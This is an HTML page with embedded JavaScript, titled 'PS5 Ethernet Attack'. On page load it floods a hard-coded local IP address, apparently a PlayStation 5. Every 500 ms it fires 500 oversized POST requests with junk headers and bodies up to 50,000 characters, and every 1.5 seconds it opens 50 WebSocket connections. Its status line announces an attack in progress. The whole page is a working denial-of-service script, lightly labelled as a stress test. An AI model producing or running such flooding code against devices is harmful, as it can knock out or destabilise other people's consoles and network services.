<!DOCTYPE html>
<html>
<head>
    <title>PS5 Ethernet Attack</title>
    <style>
        body {
            background-color: #111;
            color: #0f0;
            font-family: monospace;
            padding: 20px;
        }
    </style>
</head>
<body>
    <h1>Ethernet Stress Test PS5</h1>
    <div id="status">Preparando...</div>

    <script>
        const PS5_IP = "192.168.137.200"; // la IP de tu PS5

        function floodFetch() {
            for (let i = 0; i < 500; i++) {
                try {
                    fetch(`http://${PS5_IP}/nonexistent_path_${Math.random()}`, {
                        method: 'POST',
                        headers: {
                            'X-Test-Header': 'A'.repeat(10000),
                            'X-Corrupt-Attempt': 'B'.repeat(20000),
                        },
                        body: 'C'.repeat(50000),
                        mode: 'no-cors',
                        cache: 'no-store',
                        keepalive: true,
                    }).catch(() => {});
                } catch (e) {
                    console.log(e);
                }
            }
        }

        function floodWebSocket() {
            for (let i = 0; i < 50; i++) {
                try {
                    new WebSocket(`ws://${PS5_IP}/ws_${Math.random()}`);
                } catch (e) {
                    console.log(e);
                }
            }
        }

        function startTest() {
            document.getElementById('status').textContent = "Ataque en curso contra " + PS5_IP;
            setInterval(floodFetch, 500);
            setInterval(floodWebSocket, 1500);
        }

        window.onload = startTest;
    </script>
</body>
</html>
